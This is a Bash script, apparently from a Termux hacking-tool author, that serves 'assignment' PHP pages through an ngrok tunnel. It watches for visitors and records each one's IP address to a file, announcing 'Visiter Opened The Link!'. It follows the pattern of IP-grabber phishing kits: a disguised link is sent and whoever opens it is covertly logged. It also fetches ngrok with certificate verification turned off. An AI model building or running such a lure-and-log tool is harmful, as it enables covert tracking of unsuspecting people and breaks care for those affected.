#!/bin/bash
# HTMLHOSTING v0.0
# Powered by Dark Zakuro
# Credit goes to Dark Zakuro [github.com/DarkZakuro/]

banner() 
{
clear
printf "\e[1;91m.___.__  _____._._____.___ .___     \e[0m\e[1;96m   .___.__  ._______  ._____________._.___ .______  ._____  \e[0m\n"
printf "\e[1;91m:   |  \ \__ _:|:         ||   |    \e[0m\e[1;96m   :   |  \ : .___  \ |    ___/\__ _:|: __|:      \ :_ ___\ \e[0m\n"
printf "\e[1;91m|   :   |  |  :||   \  /  ||   |    \e[0m\e[1;96m   |   :   || :   |  ||___    \  |  :|| : ||       ||   |___\e[0m\n"
printf "\e[1;91m|   .   |  |   ||   |\/   ||   |/\  \e[0m\e[1;96m   |   .   ||     :  ||       /  |   ||   ||   |   ||   /  |\e[0m\n"
printf "\e[1;91m|___|   |  |   ||___| |   ||   /  \ \e[0m\e[1;96m   |___|   | \_. ___/ |__:___/   |   ||   ||___|   ||. __  |\e[0m\n"
printf "\e[1;91m    |___|  |___|      |___||______/ \e[0m\e[1;96m       |___|   :/        :       |___||___|    |___| :/ |. |\e[0m\n"
printf "\e[1;91m                                    \e[0m\e[1;96m               :                                     :   :/ \e[0m\n"
printf "\e[1;91m                                    \e[0m\e[1;96m                                                         :  \e[0m\n"


printf "\n\e[1;91mCoder\e[1;93m:\e[1;96mDark Zakuro\e[0m"
printf "\n\e[1;91mYoutube\e[1;93m:\e[1;96mhttps://www.youtube.com/c/DarkZakuro\e[0m"
printf "\n\e[1;91mInstagram\e[1;93m:\e[1;96m@darkzakuro\e[0m"
printf "\n\e[1;91mGithub\e[1;93m:\e[1;96mDarkZakuro\e[0m\n"
printf "\n\e[1;91m[\e[0m\e[1;93m*\e[0m\e[1;91m]\e[0m\e[1;96m You can also host your own html webpage using this tool.\e[0m"
printf "\n\e[1;91m[\e[0m\e[1;93m*\e[0m\e[1;91m]\e[0m\e[1;96m To do so, just edit the script according to the instructions.\e[0m "
printf "\n\e[1;91m     (Only basic scripting knowledge required)\e[0m"
printf "\n\n\n"
}

dependencies() 
{
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; 
}
}

stop() 
{
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)

if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
exit 1
}



catch_ip() 
{
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;96m[\e[0m\e[1;77m+\e[0m\e[1;96m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt
}




checkfound() 
{
printf "\n"
printf "\e[1;91m[\e[0m\e[1;77m*\e[0m\e[1;91m] List Of IP's Visited The Link,\e[0m\e[1;94m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Visiter Opened The Link!\n"
catch_ip
rm -rf ip.txt
fi
sleep 0.5
done 
}




payload_ngrok() 
{
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
#To add your html, edit these php files according to the instructions given inside.
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' 01.php > index.php
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' 02.php > index.php
else
sed 's+forwarding_link+'$link'+g' 03.php > index.php
fi
#Add more htmls from here.
}





select_assignment() 
{
printf "\n\e[1;91m-----\e[1;96m Choose An Assignment \e[1;91m-----\e[0m\n"    
printf "\n\e[1;91m[\e[0m\e[1;93m1\e[0m\e[1;91m]\e[0m\e[1;96m ALL ASSIGNMENTS\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;93m2\e[0m\e[1;91m]\e[0m\e[1;96m HTML ASSIGNMENT\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;93m3\e[0m\e[1;91m]\e[0m\e[1;96m CSS ASSIGNMENT\e[0m\n"
default_option_assignment="1"
read -p $'\n\e[1;91m[\e[0m\e[1;93m+\e[0m\e[1;91m]\e[1;96m Choose An Assignment \e[1;94m[Default is 1]\e[1;93m:\e[0m' option_tem
option_tem="${option_tem:-${default_option_assignment}}"
if [[ $option_tem -eq 1 ]]; then 
printf ""
elif [[ $option_tem -eq 2 ]]; then
printf ""
elif [[ $option_tem -eq 3 ]]; then
printf ""
else
printf "\e[1;93m [!] Invalid Assignment Option! try again\e[0m\n"
sleep 1
select_assignment
fi
}




ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;91m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi
if [[ -e ~/.ngrok2/ngrok.yml ]]; then
printf "\e[1;91m[\e[0m*\e[1;91m] your ngrok "
cat  ~/.ngrok2/ngrok.yml 
read -p $'\n\e[1;91m[\e[1;93m+\e[1;91m]\e[1;94m Do you want to change your ngrok authtoken? \e[1;96m[Y/n]\e[1;93m: \e[0m ' chg_token
if [[ $chg_token == "Y" || $chg_token == "y" || $cchg_token == "Yes" || $cchg_token == "yes" ]]; then
read -p $'\e[1;91m[\e[0m\e[1;93m+\e[0m\e[1;91m] Enter your valid ngrok authtoken\e[1;93: \e[0m' ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
fi
else
read -p $'\e[1;91m[\e[0m\e[1;93m+\e[0m\e[1;91m] Enter your valid ngrok authtoken\e[1;93m: \e[0m' ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
fi
printf "\e[1;91m[\e[93m+\e[1;91m]\e[1;96m Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;91m[\e[93m+\e[1;91m]\e[1;96m Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
exit 1
else
printf "\e[1;91m[\e[0m*\e[1;91m]\e[1;96m Direct link\e[1;93:\e[0m\e[1;92m %s\e[0m\n" $link
fi
payload_ngrok
checkfound
}

HtmlHosting() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n\e[1;91m-----\e[1;96m Tunnel Server \e[1;91m-----\e[0m\n"    
printf "\n\e[1;91m[\e[0m\e[1;93m*\e[0m\e[1;91m]\e[0m\e[1;96m Ngrok\e[0m\n"
default_option_server="y"
read -p $'\n\e[1;91m[\e[0m\e[1;93m+\e[0m\e[1;91m]\e[1;96m Start Port Forwarding \e[1;94m[Y/n]\e[1;93m: \e[0m' option_server
option_server="${option_server:-${default_option_server}}" 
if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" || $option_server == "YES" ]]; then
select_assignment
ngrok_server
else
printf "\e[1;91m \n[!] Closing...!\e[0m\n"
sleep 1
clear
exit
fi
}

banner
dependencies
HtmlHosting
